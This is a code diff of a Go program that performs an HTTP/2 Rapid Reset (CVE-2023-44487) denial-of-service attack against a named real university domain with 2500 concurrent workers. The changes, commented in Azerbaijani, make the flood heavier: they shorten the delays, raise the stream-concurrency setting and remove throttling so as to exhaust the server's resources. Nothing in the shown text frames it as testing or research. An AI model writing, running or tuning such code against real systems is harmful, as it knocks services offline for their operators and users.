@@ -3,9 +3,7 @@ package main
 import (
 	"crypto/tls"
 	"fmt"
-	"math/rand"
 	"net"
-	"sync"
 	"sync/atomic"
 	"time"
 
@@ -14,7 +12,7 @@ import (
 )
 
 var (
-	target  = "bbu.edu.az" // Origin IP tapmısınızsa onu yazın
+	target  = "bbu.edu.az:443" // Port mütləqdir
 	sni     = "bbu.edu.az"
 	workers = 2500
 	count   uint64
@@ -28,12 +26,12 @@ func main() {
 		go func() {
 			for {
 				attack()
-				time.Sleep(10 * time.Millisecond) // CPU-nu tam kilidləməmək üçün minimal fasilə
+				// Bağlantını tez-tez yeniləmək sistem resurslarını daha çox yorur
+				time.Sleep(5 * time.Millisecond) 
 			}
 		}()
 	}
 
-	// Səssiz Hesabat
 	for {
 		time.Sleep(5 * time.Second)
 		fmt.Printf("[HAKAI] RESET: %d | FAIL: %d\n", atomic.LoadUint64(&count), atomic.LoadUint64(&errors))
@@ -62,13 +60,12 @@ func attack() {
 	}
 	defer tlsConn.Close()
 
-	// HTTP/2 Preface
 	tlsConn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))
 
 	framer := http2.NewFramer(tlsConn, tlsConn)
-	framer.WriteSettings(http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 2000})
+	// Serverin emal limitlərini aşmaq üçün yüksək stream dəyəri
+	framer.WriteSettings(http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 10000})
 
-	// Rapid Reset (CVE-2023-44487)
 	for i := 0; i < 500; i++ {
 		streamID := uint32(2*i + 1)
 		
@@ -81,12 +78,8 @@ func attack() {
 			},
 		})
 
+		// RST_STREAM: Rapid Reset-in əsas nöqtəsi
 		framer.WriteRSTStream(streamID, http2.ErrCodeCancel)
 		atomic.AddUint64(&count, 1)
-		
-		// Sürətli bombardman - saniyədə minlərlə stream ləğvi
-		if i%10 == 0 {
-			time.Sleep(time.Microsecond)
-		}
 	}
 }
